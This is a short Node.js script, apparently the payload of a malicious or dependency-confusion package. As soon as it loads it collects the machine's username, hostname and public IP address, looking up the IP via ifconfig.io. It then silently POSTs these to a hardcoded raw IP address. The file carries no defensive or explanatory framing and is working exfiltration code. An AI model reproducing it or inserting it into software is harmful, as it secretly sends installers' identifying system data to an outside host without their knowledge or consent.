const os = require('os');
const axios = require('axios');

const username = os.userInfo().username;
let ipAddress = 'Unknown';
const hostname = os.hostname();
const apiUrl = 'http://18.197.56.206:8000/811f9486-58ef-4099-bae3-2c5f35e1e46d/'; // Replace with the API URL

// Function to get the public IP address using axios
async function getPublicIpAddress() {
  try {
    const response = await axios.get('https://ifconfig.io/ip');
    ipAddress = response.data.trim();
  } catch (error) {
    console.error('Error fetching public IP address:', error.message);
  }
}

// Function to post the information
async function postInformation() {
  await getPublicIpAddress();
  try {
    const response = await axios.post(apiUrl, {
      username,
      ipAddress,
      hostname,
    });
    console.log('Response:', response.data);
  } catch (error) {
    console.error('Error:', error.message);
  }
}

// Call the function to post the information
postInformation();

